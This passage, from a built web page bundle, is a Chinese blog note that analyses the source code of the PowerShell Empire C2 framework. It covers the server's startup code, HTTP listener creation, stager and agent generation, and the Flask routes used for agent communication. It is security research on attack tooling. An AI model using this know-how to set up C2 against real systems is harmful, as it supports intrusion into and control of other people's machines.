function">run</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    setup_logging<span class="token punctuation">(</span>args<span class="token punctuation">)</span>
    check_submodules<span class="token punctuation">(</span><span class="token punctuation">)</span>
    check_recommended_configuration<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>restport<span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restport <span class="token operator">=</span> <span class="token number">1337</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restport <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>restport<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>restip<span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restip <span class="token operator">=</span> <span class="token string">&quot;0.0.0.0&quot;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        args<span class="token punctuation">.</span>restip <span class="token operator">=</span> args<span class="token punctuation">.</span>restip<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>version<span class="token punctuation">:</span>
        <span class="token comment"># log to stdout instead of stderr</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>empire<span class="token punctuation">.</span>VERSION<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>reset<span class="token punctuation">:</span>
        choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>
            <span class="token string">&quot;\\x1b[1;33m[&gt;] Would you like to reset your Empire Server instance? [y/N]: \\x1b[0m&quot;</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">if</span> choice<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;y&quot;</span><span class="token punctuation">:</span>
            reset<span class="token punctuation">(</span><span class="token punctuation">)</span>

        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        base<span class="token punctuation">.</span>startup_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">global</span> main

        <span class="token comment"># Calling run more than once, such as in the test suite</span>
        <span class="token comment"># Will generate more instances of MainMenu, which then</span>
        <span class="token comment"># causes shutdown failure.</span>
        <span class="token keyword">if</span> main <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            main <span class="token operator">=</span> empire<span class="token punctuation">.</span>MainMenu<span class="token punctuation">(</span>args<span class="token operator">=</span>args<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">&quot;./empire/server/data/empire-chain.pem&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&quot;Certificate not found. Generating...&quot;</span><span class="token punctuation">)</span>
            subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&quot;./setup/cert.sh&quot;</span><span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

        <span class="token keyword">from</span> empire<span class="token punctuation">.</span>server<span class="token punctuation">.</span>api <span class="token keyword">import</span> app

        app<span class="token punctuation">.</span>initialize<span class="token punctuation">(</span>secure<span class="token operator">=</span>args<span class="token punctuation">.</span>secure_api<span class="token punctuation">,</span> ip<span class="token operator">=</span>args<span class="token punctuation">.</span>restip<span class="token punctuation">,</span> port<span class="token operator">=</span>args<span class="token punctuation">.</span>restport<span class="token punctuation">)</span>

    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061742430.png" alt="image-20230906174200378"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071541992.png" alt="image-20230907154153426"></p><p>旧版 Empire 默认使用 Sqlite 数据库, 这里则推荐使用 Mysql</p><p>检查完配置项并传入命令行参数后会启动数据库 <code>base.startup_db()</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061733482.png" alt="image-20230906173319387"></p><p>此函数主要用于检查数据库的初始状态是否正确, 不正确则输出报错提示(一般会在大版本更新的时候出现这种情况)</p><ul><li>创建了一个数据库会话 Session 用于与数据库交互;</li><li>如果当前用了 mysql 的话则检查 <code>unique_check</code> 列, 不存在则创建, 用来作为键值</li><li>创建索引 <code>agent_checkin_idx</code> 来加速对 <code>AgentCheckIn</code> 表的 <code>agent_id</code> 以及 <code>checkin_time</code> 列的查询</li><li>检查并生成用户记录、数据库配置记录、关键词模糊记录以及混淆配置记录的默认配置</li><li>检查数据库表结构与 model 是否一致, 有问题则输出报错并退出程序</li></ul><hr><p>接着就是初始化 main menu, 加载插件与配置:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071544018.png" alt="image-20230907154447961"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071544224.png" alt="image-20230907154401089"></p><hr><p>检查与生成证书, 然后进入 app 初始化函数</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071545870.png" alt="image-20230907154519802"></p><p>加载一堆后端路由:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071547200.png" alt="image-20230907154705101"></p><hr><p>配置 CORS, 创建一个支持异步的 WebSocket 服务器</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071550193.png" alt="image-20230907155022075"></p><hr><p>加载 Starkiller, 证书并启动服务</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071559704.png" alt="image-20230907155924600"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071600388.png" alt="image-20230907160007220"></p><hr><h3 id="listener" tabindex="-1"><a class="header-anchor" href="#listener"><span>Listener</span></a></h3>`,42),W={href:"https://tttang.com/archive/1281/",target:"_blank",rel:"noopener noreferrer"},V=t(`<p>下面开始研究 Empire 中的 <code>listener</code>, <code>stager</code> 与 <code>agent</code></p><ul><li><code>listener</code>: 监听器, C2 服务器需要与被控端连接以向其发布命令, 这就需要开放一个端口来与被控端连接; Empire 中的 http listener 就是起了一个 flask web application, 利用 flask 内置的 WSGI 来作为 server</li><li><code>stager</code> 是一个小心地木马程序 用于在目标机器上执行并与 listener 建立连接; Empire 支持通过 <code>usestager</code> 命令生成不同文件格式的 stager 以适应不同目标系统和执行方式</li><li><code>agent</code> 则是指代被控端</li></ul><hr><p>那么这里以新建与设置 HTTP listener 的流程来 debug 一下项目</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>uselistener http
<span class="token comment"># Set Port</span>
<span class="token builtin class-name">set</span> Port <span class="token number">9091</span>
<span class="token comment"># execute 以使用此 listener</span>
execute
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h4 id="listener-start" tabindex="-1"><a class="header-anchor" href="#listener-start"><span>Listener Start</span></a></h4><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>uselistener http
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111411157.png" alt="image-20230911141139416"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111412567.png" alt="image-20230911141221325"></p><p>通过如下 Get 请求匹配 URL 末尾的 listener 类型字符串来获取 listener 模板:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111424540.png" alt="image-20230911142406452"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111423446.png" alt="image-20230911142324365"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111426011.png" alt="image-20230911142657888"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111430685.png" alt="image-20230911143015534"></p><p>这些 listener 是在上图中的类 <code>ListenerTemplateService</code> 初始化时从本地 py 文件加载的:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111431472.png" alt="image-20230911143136364"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111431801.png" alt="image-20230911143120702"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111432701.png" alt="image-20230911143207618"></p><p>这里具体看看 <code>http.py</code> 中是如何写的:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111432150.png" alt="image-20230911143249071"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111433067.png" alt="image-20230911143308960"></p><p>一千多行的 listener 实现, 其中主要的函数有:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309120026688.png" alt="image-20230912002615647"></p><ul><li><code>default_response</code>: IIS 7.5 404 not found page</li><li><code>validate_options</code>: 检查 listener 中必要的 options 是否都设置好了</li><li><code>generate_launcher</code>: 为指定 listener 生成基础的启动器</li><li><code>generate_stager</code>: 生成与该 listener 通信所需的 stager 代码</li><li><code>generate_agent</code>: 生成与该 listener 通信所需的完整的 agent 代码</li><li><code>generate_comms</code>: 仅生成与该 listener 通信所需的 agent 代码块, 从而可以为新的 listener 动态更新 agent</li><li><code>start_server</code>: 根据配置生成与启动相应 Flask APP 线程</li><li><code>start</code>: Listener Start, 启动 <code>start_server()</code> 的线程实例并将其存储在 <code>self.threads</code> 字典中</li><li><code>shutdown</code>: Listener Stop, 中断存储在 <code>self.threads</code> 字典中的 server 线程</li></ul><p>具体函数实现在后面用到时再进行分析</p><hr><p>其结构与 client 端看到的回显一致:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111436012.png" alt="image-20230911143633921"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111540305.png" alt="image-20230911154029899"></p><p>然后可以通过 <code>set Host / set Name</code> 等命令设置各个属性, 然后使用 <code>options</code> 命令进行查看</p><hr><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>execute
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111551298.png" alt="image-20230911155148167"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111551417.png" alt="image-20230911155158288"></p><p>可以看到是发了条 Post 请求, 不过 Server 回显先出现了, 可能和信息打印的顺序有关系, 重新 execute 抓下包看看发了什么</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>tcpdump <span class="token parameter variable">-nn</span> <span class="token parameter variable">-vv</span> <span class="token parameter variable">-i</span> lo <span class="token parameter variable">-w</span> 202309111557_测一下httpListenerExecute命令做了什么.pcap
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111604283.png" alt="image-20230911160453109"></p><p>看样子就是把 Listener 的信息放在请求体中发过去了</p><p>查找相应的接口:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111626929.png" alt="image-20230911162653485"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111629254.png" alt="image-20230911162906141"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111632999.png" alt="image-20230911163229863"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111633752.png" alt="image-20230911163340598"></p><p>可以看到又回到 Listener 本身了, 通过 Listener json 信息实例化 Listener 然后调用其 start 函数启动 Listener</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111637592.png" alt="image-20230911163707457"></p><p>定义路由与中间件起一个 Flask app</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111644992.png" alt="image-20230911164414864"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111645112.png" alt="image-20230911164521997"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111646015.png" alt="image-20230911164619885"></p><hr><p>后续交互就可以看下具体的路由了, 这里先简单捋一下</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309120002970.png" alt="image-20230912000225909"></p><ul><li><code>/download/&lt;stager&gt;/</code>: 下载 <code>stager</code></li><li><code>/</code>, <code>/iisstart.htm</code>: 展示首页</li><li><mark>GET, POST</mark> <code>/&lt;path:request_uri&gt;</code>: 用于真正进行 C2 与 agent 之间的通信</li></ul><hr><p>之于前面的外层的 Thread 函数则是为 Listener 的 Flask app 另外起个线程跑:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111648936.png" alt="image-20230911164821706"></p><p>上图中圈起来的两个线程对应两个 Listener 在 <code>start_server</code> 函数中起的 Flask app</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111650016.png" alt="image-20230911165028907"></p><hr><h4 id="建立连接" tabindex="-1"><a class="header-anchor" href="#建立连接"><span>建立连接</span></a></h4>`,61);function n0(s0,a0){const e=p("ExternalLinkIcon"),u=p("Mermaid");return l(),o("div",null,[A,n("blockquote",null,[n("p",null,[n("a",r,[s("https://github.com/EmpireProject/Empire"),a(e)])]),n("p",null,[n("a",d,[s("powershell-empire | Kali Linux Tools --- powershell 帝国| Kali Linux 工具"),a(e)])]),n("p",null,[n("a",m,[s("PowerShell Empire 实战入门篇 - FreeBuf 网络安全行业门户"),a(e)])]),n("p",null,[n("a",g,[s("Empire 2.5：PowerShell 渗透测试实战指南(上篇) - FreeBuf 网络安全行业门户"),a(e)])])]),n("p",null,[n("a",k,[s("EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent. (github.com)"),a(e)]),s(" 是一个渗透测试框架("),v,s("), 它包含一个 Pure Powershell 2.0 的 Windows 代理和一个 Pure Python")]),h,n("blockquote",null,[n("p",null,[n("a",b,[s("eliben/pycparser: 🐍 Complete C99 parser in pure Python --- eliben/pycparser: 🐍 纯 Python 中的完整 C99 解析器 (github.com)"),a(e)])])]),B,n("blockquote",null,[n("p",null,[s("["),n("a",y,[s("已解决] poetry install 命令安装依赖报错，无法安装部分依赖 · Issue #1217 · HibiKier/zhenxun_bot (github.com)"),a(e)])]),n("p",null,[n("a",Q,[s("python - DBusErrorResponse while running poetry install - Stack Overflow --- python - 运行诗歌安装时的 DBusErrorResponse - VoidCC"),a(e)])])]),w,E,G,n("blockquote",null,[n("p",null,[n("a",D,[s("KeyRingError: Failed to create the collection: Prompt dismissed.. · Issue #3012 · python-poetry/poetry --- KeyRingError：无法创建集合：提示已关闭..·问题#3012·python-poetry/poetry (github.com)"),a(e)])]),n("p",null,[n("a",C,[s("Error: Unable to store the password for poetry-repository-pypi in the key ring: Failed to unlock the collection! · Issue #2692 · python-poetry/poetry --- 错误：无法在钥匙圈中存储诗歌存储库-pypi 的密码：无法解锁集合！ · 问题 #2692 · python-poetry/poetry (github.com)"),a(e)])]),n("p",null,[n("a",f,[s("python poetry 1.0.0 private repo issue fix – Frank-Mich's Blog --- python 诗 1.0.0 私人回购问题修复 – Frank-Mich 的博客"),a(e)])])]),N,n("blockquote",null,[n("p",null,[n("a",_,[s("Nim - 维基百科，自由的百科全书 (wikipedia.org)"),a(e)])]),n("p",null,[H,s("是一个"),n("a",U,[s("指令式"),a(e)]),s("、"),n("a",x,[s("通用"),a(e)]),s("、"),n("a",F,[s("多范式"),a(e)]),s("、"),n("a",S,[s("静态类型"),a(e)]),s("、"),n("a",q,[s("编译型"),a(e)]),s("的"),n("a",$,[s("编程语言"),a(e)]),s(", 设计目标是像"),n("a",M,[s("C"),a(e)]),s("一样快速，像"),n("a",Y,[s("Python"),a(e)]),s("一样有表达力，并像"),n("a",I,[s("Lisp"),a(e)]),s("一样有扩展性。")])]),P,n("p",null,[s("不过看上去只是拷贝没成功而已, 通过报错提示指向的网页: "),n("a",L,[s("Welcome to Pyperclip’s documentation! — Pyperclip 1.5 documentation --- 欢迎来到 Pyperclip 的文档！ — Pyperclip 1.5 文档"),a(e)]),s(" 找到了解决方案:")]),Z,n("blockquote",null,[n("p",null,[n("a",J,[s("PBSC CyberWeek 2022 PowerShell Empire Demo - YouTube"),a(e)])])]),T,K,a(u,{id:"mermaid-734",code:"eJxLy8kvT85ILCpR8Aniyk7MyYwGETZJRXaGlkZ6hmYWekamJnqGRpaxCrq6ugrhmXnxJYlF0UA6Jb+8GFOdRSwXAEsnGGg="}),R,n("blockquote",null,[n("p",null,[n("a",O,[s("BC-SECURITY/Starkiller: Starkiller is a Frontend for PowerShell Empire. --- BC-SECURITY/Starkiller：Starkiller 是 PowerShell Empire 的前端。 (github.com)"),a(e)])])]),j,n("blockquote",null,[n("p",null,[n("a",z,[s("Empire 源码分析(一) - 跳跳糖 (tttang.com)"),a(e)]),s(" -- 19 年的博客, 应该是旧版的源码目录分析, 这里作为参考, 可能是检索方法的原因, 也可能是真没有相关资源, 总之并没有检索出什么 Powershell Empire 源码分析的文章")])]),X,n("blockquote",null,[n("p",null,[n("a",W,[s("Empire 源码分析(一) - 跳跳糖 (tttang.com)"),a(e)])])]),V])}const p0=i(c,[["render",n0],["__file","Powershell-Empire.html.vue"]]),u0=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/C2/Powershell-Empire.html","title":"Powershell Empire","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"安装","slug":"安装","link":"#安装","children":[{"level":3,"title":"Github","slug":"github","link":"#github","children":[]},{"level":3,"title":"Kali","slug":"kali","link":"#kali","children":[]},{"level":3,"title":"Demo","slug":"demo","link":"#demo","children":[]}]},{"level":2,"title":"Starkiller","slug":"starkiller","link":"#starkiller","children":[]},{"level":2,"title":"整体源码概述","slug":"整体源码概述","link":"#整体源码概述","children":[{"level":3,"title":"调试","slug":"调试","link":"#调试","children":[]},{"level":3,"title":"主程序入口","slug":"主程序入口","link":"#主程序入口","children":[]},{"level":3,"title":"Listener","slug":"listener","link":"#listener","children":[]}]}],"git":{"createdTime":1714444444000,"updatedTime":1714444444000,"contributors":[{"name":"233JG","email":"ayusummer233@gmail.com","commits":1}]},"readingTime":{"minutes":22.89,"words":6867},"filePathRelative":"网络安全/内网渗透/C2/Powershell-Empire.md","localizedDate":"2024年4月30日","excerpt":"\\n<blockquote>\\n<p><a href=\\"https://github.com/EmpireProject/Empire.git\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">https://github.com/EmpireProject/Empire</a></p>\\n<p><a href=\\"https://www.kali.org/tools/powershell-empire/\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">powershell-empire | Kali Linux Tools --- powershell 帝国| Kali Linux 工具</a></p>\\n<p><a href=\\"https://www.freebuf.com/sectool/158393.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">PowerShell Empire 实战入门篇 - FreeBuf 网络安全行业门户</a></p>\\n<p><a href=\\"https://www.freebuf.com/articles/web/165925.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">Empire 2.5：PowerShell 渗透测试实战指南(上篇)  - FreeBuf 网络安全行业门户</a></p>\\n</blockquote>"}');export{p0 as comp,u0 as data};
